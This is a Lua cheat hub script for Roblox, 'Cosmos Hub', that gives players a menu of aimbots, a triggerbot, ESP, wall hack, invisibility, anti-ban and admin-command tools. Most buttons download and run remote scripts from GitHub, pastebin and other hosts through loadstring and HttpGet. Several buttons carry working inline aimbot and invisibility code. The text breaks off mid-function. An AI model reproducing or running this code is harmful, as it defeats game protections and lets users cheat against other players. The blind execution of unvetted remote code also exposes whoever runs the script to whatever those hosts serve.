-- OG Cosmos Hub
-- Made by Cosmos#5091

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Welcome To Cosmos Hub - By Cosmos#5091", "DarkTheme")
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Aimbot")
MainSection:NewButton("Aimbot V1", "Aimbot without FOV circle", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script%20(Without%20FOV).lua", true))()
end)
MainSection:NewButton("Aimbot V2", "Aimbot with FOV circle", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script.lua", true))()
end)
MainSection:NewButton("Aimbot V3", "Aimbot (Works in some games)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/AirHub/main/AirHub.lua"))()
end)
MainSection:NewButton("Aimbot V4", "Aimbot (Works in some games)", function()
    local teamCheck = false
local fov = 150
local smoothing = 1
local RunService = game:GetService("RunService")
local FOVring = Drawing.new("Circle")
FOVring.Visible = true
FOVring.Thickness = 1.5
FOVring.Radius = fov
FOVring.Transparency = 1
FOVring.Color = Color3.fromRGB(255, 128, 128)
FOVring.Position = workspace.CurrentCamera.ViewportSize/2
local function getClosest(cframe)
   local ray = Ray.new(cframe.Position, cframe.LookVector).Unit
   
   local target = nil
   local mag = math.huge
   
   for i,v in pairs(game.Players:GetPlayers()) do
       if v.Character and v.Character:FindFirstChild("Head") and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("HumanoidRootPart") and v ~= game.Players.LocalPlayer and (v.Team ~= game.Players.LocalPlayer.Team or (not teamCheck)) then
           local magBuf = (v.Character.Head.Position - ray:ClosestPoint(v.Character.Head.Position)).Magnitude
           
           if magBuf < mag then
               mag = magBuf
               target = v
           end
       end
   end
   
   return target
end
loop = RunService.RenderStepped:Connect(function()
   local UserInputService = game:GetService("UserInputService")
   local pressed = --[[UserInputService:IsKeyDown(Enum.KeyCode.E)]] UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) --Enum.UserInputType.MouseButton2
   local localPlay = game.Players.localPlayer.Character
   local cam = workspace.CurrentCamera
   local zz = workspace.CurrentCamera.ViewportSize/2
   if pressed then
       local Line = Drawing.new("Line")
       local curTar = getClosest(cam.CFrame)
       local ssHeadPoint = cam:WorldToScreenPoint(curTar.Character.Head.Position)
       ssHeadPoint = Vector2.new(ssHeadPoint.X, ssHeadPoint.Y)
       if (ssHeadPoint - zz).Magnitude < fov then
           workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame:Lerp(CFrame.new(cam.CFrame.Position, curTar.Character.Head.Position), smoothing)
       end
   end
   
   if UserInputService:IsKeyDown(Enum.KeyCode.Delete) then
       loop:Disconnect()
       FOVring:Remove()
   end
end)
end)
MainSection:NewButton("Aimbot V5", "Aimbot (Works in some games)", function()
    -- Make sure to edit the values below in a seperated script
_G.priorityPart = "Head"
_G.reactionDelay = 0 -- the lower the faster
_G.sameTeam = true
_G.toggleKey = "X" -- bind it to a familiar key, you will be using this alot
_G.esp = true -- For esp
_G.espColour = Color3.new(0,255,0)
_G.throughwalls = false -- track through walls
--
_G.triggerbot = true
_G.triggerBotDelay = 0
-- edit values below to change tracking area's size
_G.offsetSizeX = 0
_G.offsetSizeY = 0
_G.scaleSizeX = 0.1
_G.scaleSizeY = 0.1
--edit values below to change tracking area's position
_G.offsetPosX = 0
_G.offsetPosY = 0
_G.scalePosX = 0.5
_G.scalePosY = 0.5
_G.trackingColour = Color3.new(0,255,0)
_G.trackingThickness = 1
---------------
local camera = game.Workspace.CurrentCamera
local lp = game.Players.LocalPlayer
local rs = game:GetService("RunService")
local uis = game:GetService("UserInputService")
local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
function drawDot(frame, lifetime, x, y, colour)
  local screengui = Instance.new("ScreenGui")
  local frame = Instance.new("Frame")
  frame.Position = UDim2.new(0,x,0,y)
  frame.Size = UDim2.new(0,10,0,10)
  frame.Parent = screengui
  frame.BackgroundColor3 = colour
  screengui.Parent = lp.PlayerGui
  task.wait(lifetime)
  screengui:Destroy()
end
function PointMatch(frame, x, y)
  local pos = frame.AbsolutePosition
  local size = frame.AbsoluteSize
  if (y > pos.Y and y < pos.Y+size.Y) and (x > pos.X and x < pos.X+size.X) then
      return true
  end
  return false
end
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScreenGui2 = Instance.new("ScreenGui")
local Frame2 = Instance.new("Frame")
local UIStroke = Instance.new("UIStroke")
local TextLabel = Instance.new("TextLabel")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui2.ResetOnSpawn = false
ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Size = UDim2.new(_G.scaleSizeX, _G.offsetSizeX, _G.scaleSizeY, _G.offsetSizeY)
Frame.Position = UDim2.new(0.5,0,0.5,0)
Frame.AnchorPoint = Vector2.new(0.5,0.5)
Frame2.Parent = ScreenGui2
Frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame2.BackgroundTransparency = 1.000
Frame2.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000
TextLabel.TextTransparency = 1.000
UIStroke.Color = _G.trackingColour
UIStroke.Thickness = _G.trackingThickness
UIStroke.Parent = Frame
local val = 0.03333
local isOn = false
uis.InputBegan:Connect(function(input, gameproc)
if input.KeyCode == Enum.KeyCode[_G.toggleKey] and not gameproc then
isOn = not isOn
TextLabel.TextTransparency = 0
TextLabel.Text = tostring(isOn)
task.wait(3)
TextLabel.TextTransparency = 1
end
end)
function characterShootable(model)
   raycastParams.FilterDescendantsInstances = {lp.Character}
   local ray = workspace:Raycast(camera.CFrame.Position, (model[_G.priorityPart].Position-camera.CFrame.Position), raycastParams)
   return model == ray.Instance:FindFirstAncestorWhichIsA("Model")
end
rs.RenderStepped:Connect(function(t)
   if (Frame.Size.X.Offset ~= _G.offsetSizeX or Frame.Size.Y.Offset ~= _G.offsetSizeY) or (Frame.Size.X.Scale ~= _G.scaleSizeX or Frame.Size.Y.Scale ~= _G.scaleSizeY)  then
       Frame.Size = UDim2.new(_G.scaleSizeX, _G.offsetSizeX, _G.scaleSizeY, _G.offsetSizeY)
   end
   if (Frame.Position.X.Offset ~= _G.offsetPosX or Frame.Position.Y.Offset ~= _G.offsetPosY) or (Frame.Position.X.Scale ~= _G.scalePosX or Frame.Position.Y.Scale ~= _G.scalePosY)  then
       Frame.Position = UDim2.new(_G.scalePosX, _G.offsetPosX, _G.scalePosY, _G.offsetPosY)
   end
   if (UIStroke.Color ~= _G.trackingColour or UIStroke.Thickness ~= _G.trackingThickness) then
       UIStroke.Color = _G.trackingColour
       UIStroke.Thickness = _G.trackingThickness
   end
   for _, p in ipairs(game.Players:GetChildren()) do
       if p ~= lp and ((_G.sameTeam and p.Team == lp.Team) or (not _G.sameTeam and p.Team ~= lp.Team))  then
           local model = p.Character
           if model and model:FindFirstChild("Humanoid") and not model:FindFirstChild("ForceField") and model.Humanoid.Health > 0 then
               local vector, onscreen = camera:WorldToScreenPoint(model[_G.priorityPart].Position)
               if isOn and onscreen and PointMatch(Frame, vector.X, vector.Y) then
                   if _G.throughwalls or characterShootable(model)  then
                       if _G.esp then
                           drawDot(Frame, t, vector.X, vector.Y, Color3.new(255,0,0))
                       end
                       if _G.triggerbot then
                           task.wait(_G.triggerBotDelay)
                           mouse1click()
                       end
                       for i = 0.0, 0.9, 0.1 do
                           if not isOn then

                               break
                           end
                             
                           local larp = camera.CFrame:Lerp(CFrame.lookAt(camera.CFrame.Position, model[_G.priorityPart].Position), i)
                           camera.CFrame = larp
                           local quickvec = camera:WorldToScreenPoint(model[_G.priorityPart].Position)
                           if not PointMatch(Frame, quickvec.X, quickvec.Y) or not characterShootable(model) then
                               break
                           end
                           task.wait(val+(_G.reactionDelay < 0 and 0 or _G.reactionDelay))
                       end
                       
                   end
               elseif onscreen and PointMatch(Frame2, vector.X, vector.Y) and _G.esp then
                   drawDot(Frame2, t, vector.X, vector.Y, _G.espColour)
               end
           end
      end
     
  end
end)
end)
MainSection:NewButton("Silent Aim", "Press Ctrl", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Averiias/Universal-SilentAim/main/main.lua"))()
end)
MainSection:NewButton("Wall Hack", "Click to enable", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Wall-Hack/main/Resources/Scripts/Main.lua", true))()
end)
local MainSection = Main:NewSection("Tracking")
MainSection:NewButton("ESP", "Click to get tool", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
end)
MainSection:NewButton("Charms", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/eH39iKSg")))
end)
MainSection:NewButton("Tracers", "Click to get tool", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/WRD ESP.txt"))()
end)
MainSection:NewButton("X-Ray", "Press X", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/vNpnSDCz", true))()
end)
MainSection:NewButton("Reach", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/tsbVWZdP", true))()
end)
MainSection:NewButton("Server Finder", "Click to get tool", function()
    loadstring(game:HttpGet("https://www.scriptblox.com/raw/Server-Browser_80", true))();
end)
local MainSection = Main:NewSection("B-Tools")
MainSection:NewButton("Btools V1", "Click to get tool", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/TrixAde/scripts/main/Btools.lua', true))() 
end)
MainSection:NewButton("Btools V2", "Click to get tool", function()
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3
Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4 
end)

MainSection:NewButton("Btools V3", "Click to get tool", function()
    --[[
    Unrestricted BTools
    By: OpenGamerTips

    Keybinds:
    Press P for BTools
    Press L to unlock the Workspace
    Press K to enable the backpack/other core elements.
]]--
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function(key)
    key = string.lower(key)

    if key == "p" then
        for item = 1, 4 do
            HopperBin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
            HopperBin.BinType = item
        end
    elseif key == "l" then
        function UnlockWorkspace(a)
            for n,part in pairs(a:GetChildren()) do
                if(part:IsA("BasePart")) then 
                    part.Locked = false 
                end
                UnlockWorkspace(part)
            end
        end
        UnlockWorkspace(workspace)
    elseif key == "k" then
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    end
end) 
end)
MainSection:NewButton("Btools V4", "Click to get tool", function()
    --[[
A distribution of https://wearedevs.net/scripts
Last updated August 2, 2021

Description: Gives your player the old system of building tools

Instruction: Inject this script into any game using a Lua executor like JJSploit. 
]]
backpack = game:GetService("Players").LocalPlayer.Backpack
hammer = Instance.new("HopperBin")
hammer.Name = "Hammer"
hammer.BinType = 4
hammer.Parent = backpack
cloneTool = Instance.new("HopperBin")
cloneTool.Name = "Clone"
cloneTool.BinType = 3
cloneTool.Parent = backpack
grabTool = Instance.new("HopperBin")
grabTool.Name = "Grab"
grabTool.BinType = 2
grabTool.Parent = backpack 
end)
MainSection:NewButton("Btools V5", "Click to get tool", function()
    --[[
    Unrestricted BTools
	By: OpenGamerTips

	Keybinds:
	Press P for BTools
	Press L to unlock the Workspace
	Press K to enable the backpack/other core elements.
]]--
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
mouse.KeyDown:connect(function(key)
    key = string.lower(key)

	if key == "p" then
		for item = 1, 4 do
			HopperBin = Instance.new("HopperBin", game.Players.LocalPlayer.Backpack)
			HopperBin.BinType = item
		end
	elseif key == "l" then
		function UnlockWorkspace(a)
			for n,part in pairs(a:GetChildren()) do
				if(part:IsA("BasePart")) then 
					part.Locked = false 
				end
				UnlockWorkspace(part)
			end
		end
		UnlockWorkspace(workspace)
	elseif key == "k" then
		local StarterGui = game:GetService("StarterGui")
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end
end) 
end)
MainSection:NewButton("Btools V6", "Click to get tool", function()
    loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))() 
end)
local MainSection = Main:NewSection("Studio Editor")
MainSection:NewButton("Dark Dex V1", "Click to get tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/scripts/main/DarkDexV3.lua"))(); 
end)
MainSection:NewButton("Dark Dex V2", "Click to get tool", function()
    loadstring(game:GetObjects("rbxassetid://3025032531")[1].Source)()
end)
MainSection:NewButton("Dark Dex V3", "Click to get tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script4", true))() 
end)
MainSection:NewButton("Dark Dex V4", "Click to get tool", function()
    loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)() 
end)
MainSection:NewButton("Dark Dex V5", "Click to get tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceSpiffer/Scripts/main/Script5", true))() 
end)
MainSection:NewButton("Dark Dex V6", "Click to get tool", function()
    loadstring(game:HttpGet("https://controlc.com/6f4f9d2a", true))() 
end)
local Player = Window:NewTab("Player")
local PlayerSection = Player:NewSection("Player Section")
PlayerSection:NewButton("Fly", "Press C", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/ReJ0TXqg")))
end)
PlayerSection:NewButton("Invisible", "Press E", function()
    --[[Invisibility Toggle

You can find the orginal concept here: https://v3rmillion.net/showthread.php?tid=544634

This method clones the character locally, teleports the real character to a safe location, then sets the character to the clone.
Basically, your real character is in the sky while you are on the ground.


Because of the way this works, games with a decent anti-cheat will fuck this up.
If you turn it off, you have to go to a safe place before going invisible.

Written by: BitingTheDust ; https://v3rmillion.net/member.php?action=profile&uid=1628149
]]
--Settings:
local ScriptStarted = false
local Keybind = "E" --Set to whatever you want, has to be the name of a KeyCode Enum.
local Transparency = true --Will make you slightly transparent when you are invisible. No reason to disable.
local NoClip = false --Will make your fake character no clip.

local Player = game:GetService("Players").LocalPlayer
local RealCharacter = Player.Character or Player.CharacterAdded:Wait()

local IsInvisible = false

RealCharacter.Archivable = true
local FakeCharacter = RealCharacter:Clone()
local Part
Part = Instance.new("Part", workspace)
Part.Anchored = true
Part.Size = Vector3.new(200, 1, 200)
Part.CFrame = CFrame.new(0, -500, 0) --Set this to whatever you want, just far away from the map.
Part.CanCollide = true
FakeCharacter.Parent = workspace
FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

for i, v in pairs(RealCharacter:GetChildren()) do
  if v:IsA("LocalScript") then
      local clone = v:Clone()
      clone.Disabled = true
      clone.Parent = FakeCharacter
  end
end
if Transparency then
  for i, v in pairs(FakeCharacter:GetDescendants()) do
      if v:IsA("BasePart") then
          v.Transparency = 0.7
      end
  end
end
local CanInvis = true
function RealCharacterDied()
  CanInvis = false
  RealCharacter:Destroy()
  RealCharacter = Player.Character
  CanInvis = true
  isinvisible = false
  FakeCharacter:Destroy()
  workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid

  RealCharacter.Archivable = true
  FakeCharacter = RealCharacter:Clone()
  Part:Destroy()
  Part = Instance.new("Part", workspace)
  Part.Anchored = true
  Part.Size = Vector3.new(200, 1, 200)
  Part.CFrame = CFrame.new(9999, 9999, 9999) --Set this to whatever you want, just far away from the map.
  Part.CanCollide = true
  FakeCharacter.Parent = workspace
  FakeCharacter.HumanoidRootPart.CFrame = Part.CFrame * CFrame.new(0, 5, 0)

  for i, v in pairs(RealCharacter:GetChildren()) do
      if v:IsA("LocalScript") then
          local clone = v:Clone()
          clone.Disabled = true
          clone.Parent = FakeCharacter
      end
  end
  if Transparency then
      for i, v in pairs(FakeCharacter:GetDescendants()) do
          if v:IsA("BasePart") then
              v.Transparency = 0.7
          end
      end
  end
 RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
 Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
end
RealCharacter.Humanoid.Died:Connect(function()
 RealCharacter:Destroy()
 FakeCharacter:Destroy()
 end)
Player.CharacterAppearanceLoaded:Connect(RealCharacterDied)
local PseudoAnchor
game:GetService "RunService".RenderStepped:Connect(
  function()
      if PseudoAnchor ~= nil then
          PseudoAnchor.CFrame = Part.CFrame * CFrame.new(0, 5, 0)
      end
       if NoClip then
      FakeCharacter.Humanoid:ChangeState(11)
       end
  end
)

PseudoAnchor = FakeCharacter.HumanoidRootPart
local function Invisible()
  if IsInvisible == false then
      local StoredCF = RealCharacter.HumanoidRootPart.CFrame
      RealCharacter.HumanoidRootPart.CFrame = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = StoredCF
      RealCharacter.Humanoid:UnequipTools()
      Player.Character = FakeCharacter
      workspace.CurrentCamera.CameraSubject = FakeCharacter.Humanoid
      PseudoAnchor = RealCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = false
          end
      end

      IsInvisible = true
  else
      local StoredCF = FakeCharacter.HumanoidRootPart.CFrame
      FakeCharacter.HumanoidRootPart.CFrame = RealCharacter.HumanoidRootPart.CFrame
     
      RealCharacter.HumanoidRootPart.CFrame = StoredCF
     
      FakeCharacter.Humanoid:UnequipTools()
      Player.Character = RealCharacter
      workspace.CurrentCamera.CameraSubject = RealCharacter.Humanoid
      PseudoAnchor = FakeCharacter.HumanoidRootPart
      for i, v in pairs(FakeCharacter:GetChildren()) do
          if v:IsA("LocalScript") then
              v.Disabled = true
          end
      end
      IsInvisible = false
  end
end

game:GetService("UserInputService").InputBegan:Connect(
  function(key, gamep)
      if gamep then
          return
      end
      if key.KeyCode.Name:lower() == Keybind:lower() and CanInvis and RealCharacter and FakeCharacter then
          if RealCharacter:FindFirstChild("HumanoidRootPart") and FakeCharacter:FindFirstChild("HumanoidRootPart") then
              Invisible()
          end
      end
  end
)
local Sound = Instance.new("Sound",game:GetService("SoundService"))
Sound.SoundId = "rbxassetid://232127604"
Sound:Play()
game:GetService("StarterGui"):SetCore("SendNotification",{["Title"] = "Invisible Toggle Loaded",["Text"] = "Press "..Keybind.." to become change visibility.",["Duration"] = 20,["Button1"] = "Okay."})
end)
PlayerSection:NewButton("Walk On Walls", "Credits: RSCRIPTS", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Pylwt/walk-walls/main/README.md", true))()
end)
PlayerSection:NewButton("No Clip", "Press B", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/kt3Nxzw1")))
end)
PlayerSection:NewButton("Anti-Fling", "Click to activate", function()
    -- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
    local NewService = game.GetService(game, Index)
    if NewService then
    Self[Index] = NewService
    end
    return NewService
    end})
    
    -- [ LocalPlayer ] --
    local LocalPlayer = Services.Players.LocalPlayer
    
    -- // Functions \\ --
    local function PlayerAdded(Player)
       local Detected = false
       local Character;
       local PrimaryPart;
    
       local function CharacterAdded(NewCharacter)
           Character = NewCharacter
           repeat
               wait()
               PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
           until PrimaryPart
           Detected = false
       end
    
       CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
       Player.CharacterAdded:Connect(CharacterAdded)
       Services.RunService.Heartbeat:Connect(function()
           if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
               if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
                   if Detected == false then
                       game.StarterGui:SetCore("ChatMakeSystemMessage", {
                           Text = "Fling Exploit detected, Player: " .. tostring(Player);
                           Color = Color3.fromRGB(255, 200, 0);
                       })
                   end
                   Detected = true
                   for i,v in ipairs(Character:GetDescendants()) do
                       if v:IsA("BasePart") then
                           v.CanCollide = false
                           v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                           v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                           v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                       end
                   end
                   PrimaryPart.CanCollide = false
                   PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                   PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
               end
           end
       end)
    end
    
    -- // Event Listeners \\ --
    for i,v in ipairs(Services.Players:GetPlayers()) do
       if v ~= LocalPlayer then
           PlayerAdded(v)
       end
    end
    Services.Players.PlayerAdded:Connect(PlayerAdded)
    
    local LastPosition = nil
    Services.RunService.Heartbeat:Connect(function()
       pcall(function()
           local PrimaryPart = LocalPlayer.Character.PrimaryPart
           if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CFrame = LastPosition
    
               game.StarterGui:SetCore("ChatMakeSystemMessage", {
                   Text = "You were flung. Neutralizing velocity.";
                   Color = Color3.fromRGB(255, 0, 0);
               })
           elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
               LastPosition = PrimaryPart.CFrame
           end
       end)
    end)
end)
PlayerSection:NewButton("Anti-Kick", "Click to enable", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
end)
PlayerSection:NewButton("Anti-Ban", "Click to enable", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/gsxvWvnj"))()
end)
local PlayerSection = Player:NewSection("Teleportation")
PlayerSection:NewButton("Click TP", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/njMw0Bke")))
end)
PlayerSection:NewButton("Player TP", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/EBhdqeWb", true))()
end)
local PlayerSection = Player:NewSection("Movement")
PlayerSection:NewButton("Shift Run", "Press Shift", function()
    repeat wait() until game.Players.LocalPlayer 
m = game.Players.LocalPlayer:GetMouse() 
m.KeyDown:connect(function(key)
 if key == "0" then --"Shift to run" 0 == shift
  print("Running")
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 60
 end
end) 
m.KeyUp:connect(function(key)
 if key == "0" then
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
 end
end)
end)
PlayerSection:NewButton("High Jump", "Click to get tool", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/0JgQ1hJy")))
end)
PlayerSection:NewButton("Infinite Jump", "Press V", function()
    pcall(loadstring(game:HttpGet("https://pastebin.com/raw/2wgbZ6Xd"))) 
end)
PlayerSection:NewButton("Front/Back Flips", "Press Z,X,C", function()
    wait(5)
local ver = "2.00"
local scriptname = "feFlip"
local FrontflipKey = Enum.KeyCode.Z
local BackflipKey = Enum.KeyCode.X
local AirjumpKey = Enum.KeyCode.C
local ca = game:GetService("ContextActionService")
local zeezy = game:GetService("Players").LocalPlayer
local h = 0.0174533
local antigrav
function zeezyFrontflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do 
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end
function zeezyBackflip(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character.Humanoid:ChangeState("Jumping")
		wait()
		zeezy.Character.Humanoid.Sit = true
		for i = 1,360 do
			delay(i/720,function()
			zeezy.Character.Humanoid.Sit = true
				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
			end)
		end
		wait(0.55)
		zeezy.Character.Humanoid.Sit = false
	end
end
function zeezyAirjump(act,inp,obj)
	if inp == Enum.UserInputState.Begin then
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
		wait()
		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
	end
end
ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)
print(scriptname .. " " .. ver .. " loaded successfully")
print("made by Zeezy#7203")
local notifSound = Instance.new("Sound",workspace)
notifSound.PlaybackSpeed = 1.5
notifSound.Volume = 0.15
notifSound.SoundId = "rbxassetid://170765130"
notifSound.PlayOnRemove = true
notifSound:Destroy()
game.StarterGui:SetCore("SendNotification", {Title = "feFlip", Text = "feFlip loaded successfully!", Icon = "rbxassetid://505845268", Duration = 5, Button1 = "Okay"})
end)
PlayerSection:NewButton("Animations", "Click to get tools", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Luciquad/bweq42/main/cheatersoulanimationchanger.lua'))()
end)
PlayerSection:NewSlider("Walk Speed", "Choose your walk speed", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
PlayerSection:NewSlider("Jump Power", "Choose your jump power", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)
local PlayerSection = Player:NewSection("Visuals")
PlayerSection:NewButton("Hide Name", "Click to get force field", function()
    plr = game.Players.LocalPlayer
while true do wait(0.1)
game.Workspace:WaitForChild(plr)
local g = game.Workspace[plr]:FindFirstChild("mask")
if g then else wait(0.4)
local args = {
[1] = "EquipArata"
}
game:GetService("ReplicatedStorage").Events.RemoteEvent:FireServer(unpack(args))
end
end
end)
PlayerSection:NewButton("Headless", "Click to get force field", function()
    local lp = game:GetService "Players".LocalPlayer
if lp.Character:FindFirstChild "Head" then
    local char = lp.Character
    char.Archivable = true
    local new = char:Clone()
    new.Parent = workspace
    lp.Character = new
    wait(2)
    local oldhum = char:FindFirstChildWhichIsA "Humanoid"
    local newhum = oldhum:Clone()
    newhum.Parent = char
    newhum.RequiresNeck = false
    oldhum.Parent = nil
    wait(2)
    lp.Character = char
    new:Destroy()
    wait(1)
    newhum:GetPropertyChangedSignal("Health"):Connect(
        function()
            if newhum.Health <= 0 then
                oldhum.Parent = lp.Character
                wait(1)
                oldhum:Destroy()
            end
        end)
    workspace.CurrentCamera.CameraSubject = char
    if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(.1)
        char.Animate.Disabled = false
    end
    lp.Character:FindFirstChild "Head":Destroy()
end
end)
PlayerSection:NewButton("Korblox", "Click to get korblox leg", function()
    local char = game:GetService("Players").LocalPlayer.Character
-- RIGHT LEG
char.RightFoot.MeshId = "http://www.roblox.com/asset/?id=902942089"
char.RightFoot.Transparency = 1
char.RightLowerLeg.MeshId = "http://www.roblox.com/asset/?id=902942093"
char.RightLowerLeg.Transparency = 1
char.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
char.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
end)
PlayerSection:NewButton("Rainbow Cape", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/yzUss77V", true))()
end)
PlayerSection:NewButton("Flying Orb", "Click to get tool", function()
    loadstring(game:GetObjects("rbxassetid://142257690")[1].Source)()
end)
PlayerSection:NewButton("Force Field", "Click to get force field", function()
end)
local Admin = Window:NewTab("Admin")
local AdminSection = Admin:NewSection("Admin Commands")
AdminSection:NewButton("CMD-X Admin Commands", "Click to get tool", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
end)
AdminSection:NewButton("Infinite Yield Admin Commands", "Click to get tool", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
end)
AdminSection:NewButton("Fates Admin Commands", "Click to get tool", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
end)
AdminSection:NewButton("Revis Admin Commands", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/WnWVpzzr", true))()
end)
AdminSection:NewButton("Shattervast Admin Commands", "Click to get tool", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/iL4NRDux", true))()
end)
AdminSection:NewButton("Graphene Admin Commands", "Click to get tool", function()
